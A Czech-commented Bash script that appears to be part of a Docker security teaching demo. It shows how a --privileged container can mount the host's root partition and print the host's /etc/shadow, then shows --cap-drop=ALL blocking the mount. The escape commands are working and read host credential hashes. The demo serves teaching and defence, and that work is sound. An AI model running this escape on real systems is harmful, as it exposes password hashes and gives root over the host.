#!/usr/bin/env bash
# 02 — ÚNIK #2: --privileged → připojení disku hostitele → čtení /etc/shadow.
# Klíčová ukázka ze zadání: proč je --privileged tak nebezpečný.
set -euo pipefail
source "$(dirname "$0")/lib.sh"
require_docker

bad "Scénář: kontejner běží s --privileged (vývojáři to často dají 'aby to fungovalo')."
say "--privileged zpřístupní VŠECHNA zařízení /dev hostitele a vypne většinu ochran."
pause

echo
say "1) Uvnitř privileged kontejneru vidíme disky hostitele:"
run docker run --rm --privileged alpine:3.19 sh -c 'apk add --no-cache util-linux >/dev/null 2>&1; fdisk -l 2>/dev/null | grep -E "Disk /dev|Linux" | head'
pause

echo
say "2) Najdeme kořenový oddíl, připojíme ho a přečteme /etc/shadow hostitele:"
cat <<'EOS'
$ docker run --rm --privileged alpine:3.19 sh -c '
    ROOT=$(findmnt -n -o SOURCE / 2>/dev/null); \
    for d in /dev/sda1 /dev/vda1 /dev/sda2 /dev/vda2 /dev/xvda1; do \
      mkdir -p /mnt/host; mount -o ro $d /mnt/host 2>/dev/null && break; done; \
    head -n 5 /mnt/host/etc/shadow'
EOS
docker run --rm --privileged alpine:3.19 sh -c '
  apk add --no-cache util-linux >/dev/null 2>&1
  for d in /dev/sda1 /dev/vda1 /dev/sda2 /dev/vda2 /dev/xvda1 /dev/nvme0n1p1; do
    mkdir -p /mnt/host; mount -o ro "$d" /mnt/host 2>/dev/null && { echo "připojeno (read-only): $d"; break; }
  done
  if [ -f /mnt/host/etc/shadow ]; then head -n 5 /mnt/host/etc/shadow; else echo "(uprav název zařízení dle fdisk -l výše)"; fi' || warn "Uprav zařízení podle výpisu fdisk -l výše."
echo
bad "Root v privileged kontejneru = root na hostiteli. Kompletní kompromitace."
pause

echo
good "Obrana: NIKDY --privileged. Když je potřeba jen konkrétní schopnost, přidej cílenou capability:"
echo "  docker run --rm --cap-drop=ALL alpine:3.19 sh -c 'mount ... # selže'"
run docker run --rm --cap-drop=ALL alpine:3.19 sh -c 'mkdir -p /m; mount /dev/sda1 /m 2>&1 || echo "mount zakázán — cap-drop=ALL funguje"'
good "Bez CAP_SYS_ADMIN kontejner disk hostitele nepřipojí."
